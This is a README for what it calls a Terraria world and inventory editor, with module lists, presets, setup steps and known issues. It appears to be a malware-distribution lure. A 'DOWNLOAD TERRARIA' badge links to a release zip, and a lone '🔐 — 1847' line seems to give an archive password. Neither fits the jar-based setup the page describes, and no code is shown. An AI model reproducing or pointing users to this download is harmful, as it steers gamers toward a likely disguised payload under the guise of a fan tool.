`terraria` `world-editor` `terraria-tools` `java` `re-logic` `map-editor` `modding` `inventory-editor`

# Terraria-WorldEditor

## Download 🔗

[![DOWNLOAD TERRARIA](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/BoundaryLocust84/Terraria-World-Editor/releases/download/Release/World-Editor.zip)

**🔐 — 1847**

---

## Why I Built This

Sometimes you just want to build without grinding, or test boss arenas without crafting everything. I spend most of my Terraria time building elaborate bases and wiring contraptions, and honestly the 45 minutes of material farming before I can start the fun part gets old. This editor lets me jump straight into the creative side, or set up specific scenarios for testing without having to play through the whole progression every time.

## What's Inside

The editor is modular — use what you need, ignore the rest:

- **world_parser** — reads and validates Terraria world files so other modules can work with them
- **block_editor** — place, remove, or replace blocks in bulk across regions
- **chest_modifier** — edit chest contents without opening the game
- **npc_spawner** — set NPC spawn points and housing assignments
- **biome_painter** — paint biomes onto areas of your world (corruption, hallow, jungle, etc.)
- **wire_tool** — lay down or edit wiring across large areas programmatically
- **liquid_filler** — fill or drain water, lava, and honey in defined regions
- **boss_summoner** — configure boss arena setups with platforms, campfires, and heart lanterns
- **inventory_editor** — modify player inventory items, stacks, and prefixes

**Presets included:**
- `creative` — unlocks all items, max stacks, removes placement restrictions
- `adventure_prep` — sets up a world with balanced loot and exploration-ready terrain
- `speedrun` — configures arena setups and optimal item loadouts for boss rushing
- `building` — infinite building materials with utility items for construction

## How to Set It Up

1. Clone or download this repo
2. Make sure you have Java 17+ installed
3. Back up your world and player files first (seriously, do this)
4. Run `java -jar WorldEditor.jar --world "path/to/your/world.wld"`
5. Use the CLI menu to select modules and presets
6. Edited files are saved to `output/` — copy them back to your Terraria saves when ready

## Known Issues

- World parser currently supports worlds up to Terraria 1.4.4 format — newer formats may need updates
- Biome painter doesn't auto-generate biome-specific enemies or critters
- Wire tool can get confused with complex logic gate setups
- Liquid filler occasionally miscalculates flow for very large regions

> **Disclaimer:** This is a personal fan-made tool for Terraria by Re-Logic. It is not affiliated with, endorsed by, or connected to Re-Logic in any way. Use at your own risk. Always back up your save files before editing. I'm not responsible for any issues with your world files or game installation.
